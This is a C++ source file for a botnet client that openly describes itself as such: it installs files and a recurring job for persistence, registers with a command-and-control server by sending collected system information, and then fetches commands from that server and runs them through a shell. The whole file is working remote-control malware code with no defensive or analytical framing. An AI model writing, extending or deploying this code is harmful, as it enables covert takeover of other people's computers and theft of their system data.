#include "bot.hh"

#include <iostream>
#include <memory>
#include <string>

#include <experimental/filesystem>
#include "installer.hh"
#include "rapidjson/document.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/writer.h"
#include "request.hh"
#include "sysinfo.hh"
#include "util.hh"

namespace fs = std::experimental::filesystem;

// Initialize auth file and object to collect system info
Bot::Bot(const fs::path& install_dir) {
    install_ = std::make_unique<Installer>(install_dir);
    std::string auth_hash = install_->GetAuthHash();
    sysinfo_ = std::make_unique<sysinfo::DataList>(auth_hash);
}

bool Bot::IsNew() { return install_->IsNew(); }

// Install files and components
void Bot::Install() {
    install_->InstallFiles();
    install_->InitRecurringJob();
}

// Register bot with C2 server
void Bot::RegisterBot(const std::string& register_url) {
    // Create POST form from sysinfo_ and send it to C2 server
    std::string data = sysinfo_->GetPostData();
    request::Post(register_url, data);
}

void Bot::ExecuteCommand(const std::string& command_url) {
    // Create POST form from sysinfo_ and send it to C2 server
    std::string data = sysinfo_->GetPostData();
    std::string response = request::Post(command_url, data);

    // Parse JSON response from C2 server and execute command
    Command cmd(response);
    cmd.Execute();
}

bool LocalFileDep::Retrieve() {
    if (name.empty() or path.empty()) return false;

    // Don't throw for any error, but do print it
    try {
        fs::copy(
            path, name,
            fs::copy_options::recursive | fs::copy_options::overwrite_existing);
    } catch (const fs::filesystem_error& e) {
        std::cerr << e.what() << std::endl;
        return false;
    }

    return true;
}

Command::Command(std::string& c2_response) {
    // Parse into something resembling a nested unordered map
    rapidjson::Document json;
    json.Parse(c2_response.c_str());

    /* Will essentially do nothing if a proper JSON response is not sent.
     * Shell will be set to default and the command text will remain empty.
     */
    if (json.IsObject()) {
        command_text = json["command_text"].IsString()
                           ? json["command_text"].GetString()
                           : "";
        shell =
            json["shell"].IsString() ? json["shell"].GetString() : "default";

        // Ensure "files" value is an array of JSON objects
        const rapidjson::Value& dep_files = json["files"];
        if (dep_files.IsArray()) {
            ParseFileDeps_(dep_files);
        }
    } else {
        shell = "default";
    }
}

void Command::ParseFileDeps_(const rapidjson::Value& deps) {
    /* Loop through array of JSON objects, validating along the way. Invalid
     * strings for file name or path will default to empty strings. These
     * invalid files should be ignored. */
    int size = deps.Size();
    for (int i = 0; i < size; ++i) {
        const rapidjson::Value& file = deps[i];
        if (file.IsObject()) {
            std::string name =
                file["name"].IsString() ? file["name"].GetString() : "";
            std::string path =
                file["path"].IsString() ? file["path"].GetString() : "";

            if (not(name.empty() or path.empty())) {
                auto file_ptr = std::make_unique<LocalFileDep>(name, path);
                command_deps_.emplace_back(std::move(file_ptr));
            }
        }
    }
}

std::string Command::Execute() {
    // Create a temporary directory and execute command within it
    util::TempDirectory temp_dir(COMMAND_TEMP_DIR);
    fs::current_path(temp_dir.Get());

    /* Add necessary syntax before and after command text
     * depending on shell choice */
    if (shell != "default") {
        std::string pre_text, post_text;
        std::tie(pre_text, post_text) = SHELL_SYNTAX_LIST.at(shell.c_str());
        command_text = pre_text + command_text + post_text;
    }

    // Retrieve dependencies
    for (auto& dep : command_deps_) {
        dep->Retrieve();
    }

    /* Finally execute and leave temp directory. The TempDirectory instance will
     * delete the folder upon going out of scope */
    std::string output = util::PopenSubprocess(command_text.c_str());
    fs::current_path("../");

    return output;
}